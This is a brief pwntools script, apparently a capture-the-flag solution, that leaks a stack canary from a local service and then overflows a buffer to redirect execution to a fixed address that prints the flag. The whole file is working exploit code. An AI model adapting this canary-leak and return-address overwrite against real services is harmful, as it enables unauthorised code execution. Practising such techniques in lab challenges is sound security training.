from pwn import *


context.log_level = "DEBUG"
context.arch = "amd64"
context.os = "linux"


remote_ip = 'localhost'
remote_port = 1337

buffer_len = 8 * 11

r = remote(remote_ip, remote_port)

r.recv() # Receive question for name;
r.sendline(b"A" * buffer_len)

r.recv() # Receive the first response;
x = r.recv() # Receive canary;

canary = x[x.rfind(b'A')+1:x.rfind(b'A')+9] # Canary leak


exploit = b"A" * buffer_len + b"\x00" + canary[1:] + 8 * b"\x00" + p64(0x401339) # Overwrite buffer followed by canary, rbp and return address which is not position independent;

r.send(exploit) # Sending payload;

x = r.recv() # Receive flag from your_goal function;
flag = x[:x.find(b'}')]
print(flag)
